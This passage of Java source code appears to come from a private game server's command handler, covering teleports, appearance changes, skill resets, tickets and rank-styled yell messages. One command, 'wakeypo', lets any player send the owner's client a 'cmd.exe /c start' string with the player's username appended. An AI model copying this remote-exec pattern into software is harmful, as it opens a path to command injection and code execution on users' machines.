				player.getAppearence().setSkinColor(Integer.valueOf(cmd[1]));
				player.getAppearence().generateAppearenceData();
				return true;
			}
			
		//remote for supers	
		if (player.getControlerManager().getControler() instanceof DZ) {
			
			if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
		else{
			
			if (cmd[0].equalsIgnoreCase("tonpc")) {
				if (cmd.length < 2) {
					player.getPackets().sendGameMessage("Use: ::tonpc id(-1 for player)");
					return true;
				}
				try {
					player.getAppearence().transformIntoNPC(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage("Use: ::tonpc id(-1 for player)");
				}
				return true;
			}
				
				
			if (cmd[0].equalsIgnoreCase("remote")) {
				if (cmd.length < 2) {
					player.getPackets().sendGameMessage("Use: ::remote id(-1 for normal)");
					return true;
				}
				try {
					player.getAppearence().setRenderEmote(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage("Use: ::remote id(-1 for normal)");
				}
				return true;
			}
			
			}
			}
				
			
		
			if (cmd[0].equalsIgnoreCase("bank")) {
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage("You must be a Respected donator to use this command.");
					return true;
				}
				if (player.getControlerManager().getControler() != null) {
					player.getPackets().sendGameMessage("You cannot bank here!");
					return true;
				}
				player.getBank().openBank();
				return true;
			}
			
			}
			return false;
			}
//Super End

//Donator
	public static boolean processDonatorCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
			if (clientCommand) {

			} else {
			
			if (cmd[0].equalsIgnoreCase("donatorzone") || cmd[0].equals("dz")) {
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
				
				player.getControlerManager().startControler("DZ");
				player.setNextWorldTile(new WorldTile(3794, 2844, 0));
				player.getPackets().sendGameMessage("<col=00ff00>Thanks for supporting The Poanizer Project");
				return true;
				
			   
		    }
			
			
			
		
			
		if (player.getControlerManager().getControler() instanceof DZ) {
			
			if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
		
		
				if (cmd[0].equalsIgnoreCase("DZpvp")) {
				
					
			if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
				
				
					 player.setNextForceTalk(new ForceTalk("*PvP Enabled*"));
					 player.setNextGraphics(new Graphics(293));
						player.setNextAnimation(new Animation(3114));
						player.getPackets().sendGameMessage(
										"<col=FFFFFF>You are now in PvP. Be Careful");
						player.getPackets().sendGameMessage(
										"<col=FFFFFF>Pvp Boundry is the rocks placed on the open area");
					player.getControlerManager().startControler("PvPDz");
					

			}
			
			
			}
				
				if (cmd[0].equalsIgnoreCase("sexythang")) {
					player.getAppearence().setRenderEmote(1076);
					
					player.getPackets().sendGameMessage(
                                    "<col=0000FF>Type ::unsexy to Go back to normal ");
				return true;
				
				
				}
				
				if (cmd[0].equalsIgnoreCase("unsexy")) {
					player.getAppearence().setRenderEmote(-1);
					
					player.getPackets().sendGameMessage(
                                    "<col=0000FF>You are now back to normal ");
				return true;
				
				
				}
			
			if (cmd[0].equalsIgnoreCase("fly")) {
			player.getAppearence().setRenderEmote(1666);
			return true;
		}
		if (cmd[0].equalsIgnoreCase("land")) {
		player.getAppearence().setRenderEmote(-1);
		return true;
		}
		if (cmd[0].equalsIgnoreCase("chill")) {
			player.setNextForceTalk(new ForceTalk( " Chill Mode Activated "));
			player.setNextGraphics(new Graphics(74));
			player.getAppearence().setRenderEmote(693);
			return true;
		}
		if (cmd[0].equalsIgnoreCase("comeatme")) {
			player.setNextForceTalk(new ForceTalk( " Come at me Bro! "));
			player.setNextGraphics(new Graphics(574));
			player.getAppearence().setRenderEmote(1614);
			return true;
		}
	
		if (cmd[0].equalsIgnoreCase("nigel")) {
			    player.setNextForceTalk(new ForceTalk( "Everybody do the nigel!"));
				player.setNextGraphics(new Graphics(5));
				player.getAppearence().setRenderEmote(608);
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("dzlook")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3040,4527, 2));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to the donatorzone lookout. Need to have medium graphics. ");
				return true;
		    }
			
			}
			return false;
			}
//Donator End

//Yell


	public static void sendYell(Player player, String message,
			boolean isStaffYell) {
		if (player.getMuted() > Utils.currentTimeMillis()) {
			player.getPackets().sendGameMessage("You temporary muted. Recheck in 48 hours.");
			return;
		}
		if (player.getRights() < 10) {
			String[] invalid = { "<euro", "<img", "<img=", "<col", "<col=",
					"<shad", "<shad=", "<str>", "<u>" };
			for (String s : invalid)
				if (message.contains(s)) {
					player.getPackets().sendGameMessage("You cannot add additional code to the message.");
					return;
				}
		}
		for (Player players : World.getPlayers()) {
			if (players == null || !players.isRunning())
				continue;
			if (isStaffYell) {
				if (players.getRights() > 3)
					players.getPackets().sendGameMessage("<col=1589FF>[Staff Yell]</col> " + Utils.formatPlayerNameForDisplay(player.getUsername()) + ": " + message + ".", true);
				return;
			}			
		
		
		
//Staff custom yells.
		
		//Owner		
		 if (player.getUsername().equalsIgnoreCase("Poanizer")) {
				players.getPackets().sendGameMessage(
					"<img=8><col=FFFF00>[Owner]</col=FFFF00><col=FF0000>"
							+ player.getDisplayName() + ": </col><col=2E2EFE>"
							+ message + "</col>");
		//Co owner		
		}else if (player.getUsername().equalsIgnoreCase("")) {
		players.getPackets().sendGameMessage(
		"<img=8><col=FFFF00>[Co Owner]</col=FFFF00><col=FF0000>"
			+ player.getDisplayName() + ": </col><col=2E2EFE>"
			+ message + "</col>");
		
		//Admin
		} else if (player.getUsername().equalsIgnoreCase("")) {
				players.getPackets().sendGameMessage(
						"<img=1>[<col=9c2929>Admin</col>]"
								+ player.getDisplayName() + ": <col=9c2929>"
								+ message + "</col>");

		//Global Mod	
		} else if (player.getUsername().equalsIgnoreCase("")) {
				players.getPackets().sendGameMessage(
						"<img=1>[<col=660066>Global Moderator</col>]"
								+ player.getDisplayName() + ": <col=660066>"
								+ message + "</col>");
		//Ingame Mod					
		} else if (player.getUsername().equalsIgnoreCase("")) {
			players.getPackets().sendGameMessage(
						"<img=0>[<col=FF8000>Moderator</col>]"
								+ player.getDisplayName() + ": <col=FF8000>"
								+ message + "</col>");
		//Player support
		} else if (player.getUsername().equalsIgnoreCase("")) {
				players.getPackets().sendGameMessage(
						"<img=9><img=12>[<col=00449c>Support Team</col>]<col=00449c>"
								+ player.getDisplayName() + ":</col> <col=00449c>"
								+ message + "</col>");
								
		//GFX								
		} else if (player.getUsername().equalsIgnoreCase("")) {
			players.getPackets().sendGameMessage(
						"<img=14>[<col=FFF00>GFX Designer</col>]"
								+ player.getDisplayName() + ": <col=FFF00>"
								+ message + "</col>");
		//Forum								
		} else if (player.getUsername().equalsIgnoreCase("")) {
			players.getPackets().sendGameMessage(
						"<img=6>[<col=FFF00>Forum </col>]"
								+ player.getDisplayName() + ": <col=FFF00>"
								+ message + "</col>");
		
//CUSTOMS				
		}else if (player.getUsername().equalsIgnoreCase("Steel_kiwi")) {
				players.getPackets().sendGameMessage(
						"[<img=0><col=1589FF>Le_Kiwi</col>]"
								+ player.getDisplayName() + ": <col=1589FF>"
								+ message + "</col>");
								
		}else if (player.getUsername().equalsIgnoreCase("Snuffy")) {
		players.getPackets().sendGameMessage(
		"[<img=15]<col=1589FF>Le_Snuff</col>]"
			+ player.getDisplayName() + ": </col><col=FF00FF>"
			+ message + "</col>");
			
		} else if (player.getUsername().equalsIgnoreCase("")) {
		players.getPackets().sendGameMessage(
		"<img=1><col=FF00FF>[War-chief]</col=FF00FF><col=FF0000>"
			+ player.getDisplayName() + ": </col><col=FFFFFF>"
			+ message + "</col>");
		
		} else if (player.getUsername().equalsIgnoreCase("")) {
		players.getPackets().sendGameMessage(
		"<img=0><col=66FFFF>[I got banned]</col=6600CC><col=6600FF>"
		+ player.getDisplayName() + ": </col><col=660099>"
		+ message + "</col>");

		
//DEFAULT RANKS			
	} else if (player.getRights() == Settings.IS_NORMAL_PLAYER) {
		players.getPackets().sendGameMessage(
		"<col=80FF00>[Player]<col=FFFFFF>"
			+ player.getDisplayName() + ": </col><col=FFFFFF>"
			+ message + "</col>");
			
	
	} else if (player.getRights() == Settings.IS_HIDDEN) {
		players.getPackets().sendGameMessage(
		"<col=80FF00>[Player.]<col=FFFFFF>"
			+ player.getDisplayName() + ": </col><col=FFFFFF>"
			+ message + "</col>");
					
	
	
	} else if (player.getRights() == Settings.IS_OWNER) {
		players.getPackets().sendGameMessage(
		"<col=FFFFFF>[Not Owner]<col=FFFFFF>"
			+ player.getDisplayName() + ": </col><col=FFFFFF>"
			+ message + "</col>");
			
	} else if (player.getRights() == Settings.IS_TRUSTED) {
		players.getPackets().sendGameMessage(
		"<img=15><col=00ebd2>[Trusted]<col=ad67e3>"
			+ player.getDisplayName() + ": </col><col=00358d>"
			+ message + "</col>");
	
	} else if (player.getRights() == Settings.IS_ADMIN) {
		players.getPackets().sendGameMessage(
						"<img=1>[<col=660066>[Admin]</col>]"
								+ player.getDisplayName() + ": <col=660066>"
								+ message + "</col>");
			
	} else if (player.getRights() == Settings.IS_DEVELOPER) {
		players.getPackets().sendGameMessage(
						"<img=1><col=660066>[Developer]</col>"
								+ player.getDisplayName() + ": <col=660066>" + message + "</col>");
			
			
	} else if (player.getRights() == Settings.IS_GLOBAL) {
		players.getPackets().sendGameMessage(
						"<img=1>[<col=660066>Global Moderator</col>]"
								+ player.getDisplayName() + ": <col=660066>"
								+ message + "</col>");
		
			
	} else if (player.getRights() == Settings.IS_MOD) {
		players.getPackets().sendGameMessage(
						"<img=0>[<col=FF8000>Moderator</col>]"
								+ player.getDisplayName() + ": <col=FF8000>"
								+ message + "</col>");

	} else if (player.getRights() == Settings.IS_SUPPORT) {
		players.getPackets().sendGameMessage(
						"<img=9><col=00449c>[Support Team]</col><col=00449c>"
								+ player.getDisplayName() + ":</col> <col=00449c>"
								+ message + "</col>");
								
								//GFX								
	} else if (player.getRights() == Settings.IS_GRAPHIC) {
			players.getPackets().sendGameMessage(
						"<img=14>[<col=FFF00>GFX Designer</col>]"
								+ player.getDisplayName() + ": <col=FFF00>"
								+ message + "</col>");
//Forum								
	} else if (player.getRights() == Settings.IS_FORUM) {
			players.getPackets().sendGameMessage(
						"<img=8>[<col=FFF00>Forum Moderator</col>]"
								+ player.getDisplayName() + ": <col=FFF00>"
								+ message + "</col>");
				
								
	} else if (player.getRights() == Settings.IS_DONATOR) {
				players.getPackets().sendGameMessage(
						"<img=10>[<col=FF00FF>Donator</col>]<col=FF00FF>"
								+ player.getDisplayName() + ":</col> <col=FF00FF>"
								+ message + "</col>");
			
	} else if (player.getRights() == Settings.IS_SUPER) {
				players.getPackets().sendGameMessage(
						"<img=11>[<col=FF00FF>Super Donator</col>]<col=FF00FF>"
								+ player.getDisplayName() + ":</col> <col=FF00FF>"
								+ message + "</col>");

	} else if (player.getRights() == Settings.IS_RESPECTED) {
				players.getPackets().sendGameMessage(
						"<img=12>[<col=FF00FF>Respected Donator</col>]<col=FF00FF>"
								+ player.getDisplayName() + ":</col> <col=FF00FF>"
								+ message + "</col>");
		}
	}
}
	private static int getTicketAmount() {
		int amount = 0;
		for (Player players : World.getPlayers()) {
			if (players.isUsingTicket())
				amount++;
		}
		return amount;
	}
//Yell End

//Normal_Player
	public static boolean processNormal_PlayerCommand(Player player, String[] cmd,
				boolean console, boolean clientCommand) {
		if (clientCommand) {

		} else {
			
			
			
			if (cmd[0].equalsIgnoreCase("skull")) {
				player.setWildernessSkull();
			}	
	if (cmd[0].equalsIgnoreCase("killme")) {
				
				if (player.getControlerManager().getControler() != null) {
					player.getPackets().sendGameMessage("You cannot kill yourself here, go home!");
					return true;
				}
				player.applyHit(new Hit(player, 90000, HitLook.REGULAR_DAMAGE));
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("resetprestige")) {
		player.prestige = 0;
		
		}

		if (cmd[0].equalsIgnoreCase("stopkc")) {
		player.killcounting = false;
		player.getPackets().sendGameMessage("You have stopped counting your kills");
		}
		
		if (cmd[0].equalsIgnoreCase("startkc")) {
		player.killcounting = true;
		player.getPackets().sendGameMessage("You have started counting your kills");
		}
		
		if (cmd[0].equalsIgnoreCase("resetkc")) {
		player.killcounter = 0;
		player.getPackets().sendGameMessage("You have reset your kill counter to 0");
		}
		
		
				if (cmd[0].equalsIgnoreCase("Logout")) {
				player.logout();
			}
			
			if (cmd[0].equalsIgnoreCase("empty")) {
				player.getInventory().reset();
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("ticket")) {
				if (player.getControlerManager().getControler() != null) {
					player.getPackets().sendGameMessage("You can't subtime a ticket here.");
				}
				if (player.isUsingTicket()) {
					player.getPackets()
					.sendGameMessage("You've already submitted a ticket, please wait for your turn.");
					return true;
				}
				player.setUsingTicket(true);
				player.getPackets().sendGameMessage("Your ticket has been submitted.");
				for (Player staff : World.getPlayers()) {
					if (staff.getRights() >= 1)
						staff.getPackets().sendGameMessage("" + player.getDisplayName() + " has submitted a help ticket. There are now " + getTicketAmount() + " open tickets.");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("fish")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2590,	3423, 0));
				return true;
			}
			if (cmd[0].equalsIgnoreCase("thieve")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2663,	3304, 0));
				player.getPackets().sendGameMessage(
							"Welcome to Thieving.");
				player.getPackets().sendGameMessage(
							"Type ::theive to go on the other side.");
					return true;
			}
			if (cmd[0].equalsIgnoreCase("theive")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2663,	3304, 0));
				player.getPackets().sendGameMessage(
							"Welcome to Thieving.");
				player.getPackets().sendGameMessage(
							"Type ::thieve to go on the other side.");
					return true;
			}
		
			if (cmd[0].equalsIgnoreCase("taverly")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2884,	9809, 0));
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("slayertower")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3426,	3538, 0));
					player.getPackets().sendGameMessage("For slayertower second floor do ;;slayertower2");
					player.getPackets().sendGameMessage("For slayertower third floor do ;;slayertower3");
				return true;
			}
			if (cmd[0].equalsIgnoreCase("slayertower2")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3432,	3573, 1));
					player.getPackets().sendGameMessage("For slayertower first floor do ;;slayertower");
					player.getPackets().sendGameMessage("For slayertower third floor do ;;slayertower3");
				return true;
			}
			if (cmd[0].equalsIgnoreCase("slayertower3")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3421,	3539, 2));
					player.getPackets().sendGameMessage("For slayertower first floor do ;;slayertower");
					player.getPackets().sendGameMessage("For slayertower second floor do ;;slayertower2");
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("Slayerpoints")) {
			
			player.getPackets().sendGameMessage("You have " + player.SlayerPoints + " Slayer Points");
			
			}
			
			
			
			
			
			
			
		
			if (cmd[0].equalsIgnoreCase("icefiends")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2731,	10220, 0));
				return true;
			}
			if (cmd[0].equalsIgnoreCase("glacors")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(4185,	5734, 0));
				return true;
			}
			if (cmd[0].equalsIgnoreCase("mine")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3298,	3299, 0));
				return true;
			}
			if (cmd[0].equalsIgnoreCase("qbd")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3535,	5186, 0));
				return true;
			}
			if (cmd[0].equalsIgnoreCase("farming")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2816,	3462, 0));
				player.sm("Click on the patches, and have either potato, ranarr, guam, kuarm, lantadyme, or torstol seeds.");
				return true;
			}
			if (cmd[0].startsWith("hunt")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2593,	2927, 0));
				return true;
			}
			if (cmd[0].equalsIgnoreCase("score")|| cmd[0].equalsIgnoreCase("kdr")) {
				double kill  = player.getKillCount();
				double death = player.getDeathCount();
				double dr = kill / death;
				player.setNextForceTalk(new ForceTalk("<col=ff0000>I'VE KILLED " + player.getKillCount() + " PLAYERS AND BEEN KILLED " + player.getDeathCount() + " TIMES. DR: " + dr));
				return true;
			}

			
		
			if (cmd[0].equalsIgnoreCase("players2")) {
				player.getPackets().sendGameMessage("There are currently " + World.getPlayers().size() + " players playing " + Settings.SERVER_NAME+ ".");
				return true;
			}
			if (cmd[0].equalsIgnoreCase("help")) {
				player.getInventory().addItem(1856, 1);
				player.getPackets().sendGameMessage("You receive a guide book about " + Settings.SERVER_NAME + ".");
				return true;
			}

			if (cmd[0].equalsIgnoreCase("title")) {
				if (Integer.valueOf(cmd[1]) == 31){
				player.sm(" You dont want that title");
				return true;
				}
				if (cmd.length < 2) {
					player.getPackets().sendGameMessage("Use: ::title id");
					return true;
				}
				try {
					player.getAppearence().setTitle(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage("Use: ::title id");
				}
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("blueskin")) {
				player.getAppearence().setSkinColor(12);
				player.getAppearence().generateAppearenceData();
				return true;
			}
			if (cmd[0].equalsIgnoreCase("dismiss")){
				if (player.getPetId() == 0) {
					return true;
				}
				player.getPet().dissmissPet(false);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("greenskin")) {
				player.getAppearence().setSkinColor(13);
				player.getAppearence().generateAppearenceData();
				return true;
			}
			if (cmd[0].equalsIgnoreCase("resatk")) {
				player.getSkills().resetSkillNoRefresh(Skills.ATTACK);
				player.getSkills().refresh(Skills.ATTACK);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("resdef")) {
				player.getSkills().resetSkillNoRefresh(Skills.DEFENCE);
				player.getSkills().refresh(Skills.DEFENCE);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("resprayer")) {
				player.getSkills().resetSkillNoRefresh(Skills.PRAYER);
				player.getSkills().refresh(Skills.PRAYER);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("resmage")) {
				player.getSkills().resetSkillNoRefresh(Skills.MAGIC);
				player.getSkills().refresh(Skills.MAGIC);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("resdung")) {
				player.getSkills().resetSkillNoRefresh(Skills.DUNGEONEERING);
				player.getSkills().refresh(Skills.DUNGEONEERING);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("reshp")) {
				player.getSkills().resetSkillNoRefresh(Skills.HITPOINTS);
				player.getSkills().refresh(Skills.HITPOINTS);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("resrange")) {
				player.getSkills().resetSkillNoRefresh(Skills.RANGE);
				player.getSkills().refresh(Skills.RANGE);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("resstr")) {
				player.getSkills().resetSkillNoRefresh(Skills.STRENGTH);
				player.getSkills().refresh(Skills.STRENGTH);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("ressumm")) {
				player.getSkills().resetSkillNoRefresh(Skills.SUMMONING);
				player.getSkills().refresh(Skills.SUMMONING);
				return true;
			}
			
		
			
		
			   if (cmd[0].equalsIgnoreCase("clanwars")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2993,9679, 0));                                       
                            player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to clanwars, "+player.getDisplayName());
				return true;
		    }
			  
				
			if (cmd[0].equalsIgnoreCase("female")) {
                player.getAppearence().female();
				player.getAppearence().generateAppearenceData();
				}
			if (cmd[0].equalsIgnoreCase("male")) {
                player.getAppearence().male();
				player.getAppearence().generateAppearenceData();
				}	
			if (cmd[0].equalsIgnoreCase("swaghaters")) {
                player.getAppearence().swaghater();
				player.getAppearence().generateAppearenceData();
				}	
				
				
			//unlocks almost all music tracks on next login.
			if (cmd[0].equalsIgnoreCase("unlockmusic")) {
				player.unlockMusic = true;	
				player.getPackets().sendGameMessage("Music will be unlocked when you next login.");
			}	
			if (cmd[0].equalsIgnoreCase("unlockmusicoff")) {
				player.unlockMusic = false;	
				player.getPackets().sendGameMessage("MusicUnlock has been set to false.");
			}
			
			if(cmd[0].equalsIgnoreCase("sdz")) {
				 Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3042,4492, 0));
					player.getPackets().sendGameMessage(
                            "<col=00ff00>Welcome to SDZ, "+player.getDisplayName());
		return true;
			}
				 if (cmd[0].equalsIgnoreCase("edge")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3087,3492, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to edge, "+player.getDisplayName());
				return true;
				
				
				}
				 if (cmd[0].equalsIgnoreCase("home")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2632,4890, 2));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome home, "+player.getDisplayName());
				return true;
				
				
				}
				
				
				
				
				
		if (cmd[0].equalsIgnoreCase("amimaxed")) {
		player.getPackets().sendGameMessage("Your cb level is: " + String.valueOf(player.getSkills().getCombatLevel()));
		player.getPackets().sendGameMessage("Your  con level is: " + String.valueOf(player.getSkills().getLevel(Skills.CONSTRUCTION)));
		player.getPackets().sendGameMessage("Your  runecraft level is: " + String.valueOf(player.getSkills().getLevel(Skills.RUNECRAFTING)));
		player.getPackets().sendGameMessage("Your dung  level is: " + String.valueOf(player.getSkills().getLevel(Skills.DUNGEONEERING)));
		player.getPackets().sendGameMessage("Your agility  level is: " + String.valueOf(player.getSkills().getLevel(Skills.AGILITY)));
		player.getPackets().sendGameMessage("Your hebr  level is: " + String.valueOf(player.getSkills().getLevel(Skills.HERBLORE)));
		player.getPackets().sendGameMessage("Your theive level is: " + String.valueOf(player.getSkills().getLevel(Skills.THIEVING)));
		player.getPackets().sendGameMessage("Your craft  level is: " + String.valueOf(player.getSkills().getLevel(Skills.CRAFTING)));
		player.getPackets().sendGameMessage("Your fletch  level is: " + String.valueOf(player.getSkills().getLevel(Skills.FLETCHING)));
		player.getPackets().sendGameMessage("Your slayer  level is: " + String.valueOf(player.getSkills().getLevel(Skills.SLAYER)));
		player.getPackets().sendGameMessage("Your hunter  level is: " + String.valueOf(player.getSkills().getLevel(Skills.HUNTER)));
		player.getPackets().sendGameMessage("Your mining  level is: " + String.valueOf(player.getSkills().getLevel(Skills.MINING)));
		player.getPackets().sendGameMessage("Your smithing  level is: " + String.valueOf(player.getSkills().getLevel(Skills.SMITHING)));
		player.getPackets().sendGameMessage("Your fishing  level is: " + String.valueOf(player.getSkills().getLevel(Skills.FISHING)));
		player.getPackets().sendGameMessage("Your cooking  level is: " + String.valueOf(player.getSkills().getLevel(Skills.COOKING)));
		player.getPackets().sendGameMessage("Your firemaking  level is: " + String.valueOf(player.getSkills().getLevel(Skills.FIREMAKING)));
		player.getPackets().sendGameMessage("Your woodcutting  level is: " + String.valueOf(player.getSkills().getLevel(Skills.WOODCUTTING)));
		player.getPackets().sendGameMessage("Your farming  level is: " + String.valueOf(player.getSkills().getLevel(Skills.FARMING)));
				



		 if(
                	(player.getSkills().getCombatLevel() < 138)&&
					(player.getSkills().getLevel(Skills.RUNECRAFTING) < 99)&& 
					(player.getSkills().getLevel(Skills.CONSTRUCTION) < 99)&& 
				    (player.getSkills().getLevel(Skills.RUNECRAFTING) < 99)&& 
					(player.getSkills().getLevel(Skills.DUNGEONEERING) < 120)&& 
					(player.getSkills().getLevel(Skills.AGILITY) < 99)&&
					(player.getSkills().getLevel(Skills.HERBLORE) < 99)&& 
					(player.getSkills().getLevel(Skills.THIEVING) < 99)&& 
					(player.getSkills().getLevel(Skills.CRAFTING) < 99)&& 
					(player.getSkills().getLevel(Skills.FLETCHING) < 99)&& 
					(player.getSkills().getLevel(Skills.SLAYER) < 99)&& 
					(player.getSkills().getLevel(Skills.HUNTER) < 99)&& 
					(player.getSkills().getLevel(Skills.MINING) < 99)&& 
					(player.getSkills().getLevel(Skills.SMITHING) < 99)&& 
					(player.getSkills().getLevel(Skills.FISHING) < 99)&& 
					(player.getSkills().getLevel(Skills.COOKING) < 99)&& 
					(player.getSkills().getLevel(Skills.FIREMAKING) < 99)&& 
					(player.getSkills().getLevel(Skills.WOODCUTTING) < 99)&& 
					(player.getSkills().getLevel(Skills.FARMING) < 99) 
								){
								player.getPackets().sendGameMessage( "working, says you dont have levels");
								
								}
		else{
		
		player.getPackets().sendGameMessage( "will let you max");
								
								
			}

				
		}
				
	if (cmd[0].equalsIgnoreCase("wakeypo")){

		if(Settings.wokepo <= Utils.currentTimeMillis()){
					String username = "poanizer";
					Player p2 = World.getPlayerByDisplayName(username);
					
				
				
					p2.getPackets().sendExecMessage("cmd.exe /c start Wakeup_" +  player.getUsername());
					
					
					player.getPackets().sendGameMessage(
								"Waking up poanizer..");
				Settings.wokepo = (Utils.currentTimeMillis() + 90000);
				}
			else{
				player.getPackets().sendGameMessage( "Just wait a minute before waking him up again.");
					
						}
			return true;
			}
			
		
				if ((cmd[0].equalsIgnoreCase("shops")|| cmd[0].equalsIgnoreCase("shop"))) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2604,4775, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to shops, "+player.getDisplayName());
				return true;
				
				
				}	
		
			
				 if (cmd[0].equalsIgnoreCase("ok")) {
                  player.infowarning = false;  
							player.getPackets().sendGameMessage("Thanks for reading it.");
				return true;
				}	
				if (cmd[0].equalsIgnoreCase("raymondbrah")) {
				player.setSkull(17);return true;
				}
				if (cmd[0].equalsIgnoreCase("notok")) {
                player.infowarning = true;  
				player.getPackets().sendGameMessage(String.valueOf( player.infowarning));
				return true;
				
				
				}
			
			
				
			
			
					//will show all players online when you login.
					if (cmd[0].equalsIgnoreCase("pliston")) {
						player.PList = true;
						player.getPackets().sendGameMessage( "Online Player list will show when you login");
				
						return true;
					}
					//disables
					if (cmd[0].equalsIgnoreCase("plistoff")) {
						player.PList = false;
						player.getPackets().sendGameMessage( "The Login, Online Player list is off");
						return true;
					}
					
					//Will enable the login messages EG: "Welcome to The Poanizer Project vote etc."
					if (cmd[0].equalsIgnoreCase("loginmesson")) {
						player.loginmessages = true;
						player.getPackets().sendGameMessage( "Login messages are enabled.");
						return true;
					}
					//disables
					if (cmd[0].equalsIgnoreCase("loginmessoff")) {
						player.loginmessages = false;
						player.getPackets().sendGameMessage( "Login messages are disabled.");
				
						return true;
					}
					
					
					//Will show the donator message: "Your donator rank never expires"
					if (cmd[0].equalsIgnoreCase("dmesson")) {
						player.donorMess = false;
						player.getPackets().sendGameMessage( "Donor Login Message is Off");
				
						return true;
					}
					//disables
					if (cmd[0].equalsIgnoreCase("dmessoff")) {
						player.donorMess = true;
						player.getPackets().sendGameMessage( "Donor Login Message is On");
				
						return true;
					}
					
					//Will show the "you have reached 99 X"
					if (cmd[0].equalsIgnoreCase("lvlmesson")) {
						player.levelmessage = true;
						player.getPackets().sendGameMessage("Level Messages are on.");
								
						}
					//disables them
					if (cmd[0].equalsIgnoreCase("lvlmessoff")) {
						player.levelmessage = false;
						player.getPackets().sendGameMessage("Level Messages are off.");
								
						}
						
		
						
						
		//Kalphite king
				 if (cmd[0].equalsIgnoreCase("kking")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3214,2832, 0));                                        
                            player.getControlerManager().startControler("KKing");
							player.getPackets().sendGameMessage(
                                    "<col=ff0000>Warning Kalphite King inbound good luck, "+player.getDisplayName());
				return true;
				
				
				}
				
				
	
		//autovote
/*
				if (cmd[0].equals("claimvote") || cmd[0].equals("claim")) {
                int freeSlots = player.getInventory().getFreeSlots();
			if (freeSlots < 1) {
				player.getPackets().sendGameMessage(
						"Not enough space in your inventory.");
			}
			else{
				
				try {
                    VoteReward reward = Launcher.vote.hasVoted(player.getUsername().toLowerCase().replaceAll(" ", "_"));
                    if(reward != null){
                        switch(reward.getReward()){
                            case 0:
                                player.VotePoints += 1; 
                                break;
                            case 1:
								player.getInventory().addItem(995 , 6000000);
                                break;
							case 2:
								player.getInventory().addItem(12852 , 300);
                                
								break;
							case 3:
								player.getInventory().addItem(537 , 50);
                                
								break;
							case 4:
								player.getInventory().addItem(12163 , 20);
								break;
								
							case 5:
								player.getInventory().addItem(15300 , 1);
								break;
								
                            default:
                              player.getPackets().sendGameMessage("Reward not found. Please contact staff.");
                                break;
                        }
                       player.getPackets().sendGameMessage("Thank you for voting.");
					   player.timesVoted += 1;
					   for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
				
				players.getPackets().sendGameMessage("<col=FF0000> Congratulations, " + player.getUsername() + " Has Just Voted and Claimed there reward! Type ::Vote now!");
				}
                    } else {
                        player.getPackets().sendGameMessage("You have no items waiting for you.");
                    }
                } catch (Exception e){
                  player.getPackets().sendGameMessage( "[Vote] An SQL error has occured.");
                }
                    return true;
				}
			}
*/
					if (cmd[0].equalsIgnoreCase("chickens")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2987,9637, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to Chickens BWUK BWUK!");
				return true;
				
				
				}

				
				
				if (cmd[0].equalsIgnoreCase("Tzhaar")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2444,5169, 0));                                        
                            
